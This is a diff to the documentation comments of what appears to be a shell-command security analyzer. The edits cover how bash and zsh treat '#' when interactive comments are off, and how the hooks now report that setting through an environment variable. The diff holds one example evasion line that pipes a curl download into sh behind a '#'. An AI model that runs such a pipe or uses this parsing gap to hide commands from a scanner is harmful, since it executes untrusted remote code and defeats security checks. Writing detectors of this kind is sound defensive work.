@@ -6,13 +6,14 @@
 //! (`zsh -f -i`). bash does the same after `shopt -u interactive_comments` (on
 //! by default). There `echo hi #; curl https://example.invalid/x | sh` prints
 //! `hi #` and runs the pipe, while the POSIX analysis drops everything after
-//! the `#` as a comment. The bash and zsh hooks report the option state with
-//! `--no-interactive-comments`, which reaches the engine as
-//! `AnalysisContext::interactive_comments == false` ([`applies`]). The engine
-//! then also analyzes [`comment_probe`]'s copy of the input, in which each
-//! such `#` is escaped into a literal word character, and adds what that
-//! analysis finds to the analysis of the input as typed: the raw reading is
-//! never replaced.
+//! the `#` as a comment. The bash and zsh hooks report the option state in
+//! the environment (`_TIRITH_INTERACTIVE_COMMENTS=0`, which a pinned older
+//! binary ignores; `--no-interactive-comments` says the same on the command
+//! line), which reaches the engine as `AnalysisContext::interactive_comments
+//! == false` ([`applies`]). The engine then also analyzes [`comment_probe`]'s
+//! copy of the input, in which each such `#` is escaped into a literal word
+//! character, and adds what that analysis finds to the analysis of the input
+//! as typed: the raw reading is never replaced.
 //!
 //! Where the interactive shell reads a word-start `#` as a word character,
 //! each checked in a pty against zsh 5.9 (`-f -i`) and bash 5.3 (`shopt -u
@@ -58,7 +59,8 @@ use crate::tokenize::ShellType;
 /// Whether this analysis reads input the way an interactive POSIX shell
 /// without comment recognition reads it: an exec check from the bash/zsh
 /// hooks or a paste check from their paste widgets (`--interactive`), whose
-/// shell reported `--no-interactive-comments`. Agent integrations pass
+/// shell reported comments off (`_TIRITH_INTERACTIVE_COMMENTS=0` or
+/// `--no-interactive-comments`). Agent integrations pass
 /// `--non-interactive` and run commands in shells that recognise comments;
 /// fish, PowerShell and cmd hooks never report the option.
 pub(crate) fn applies(
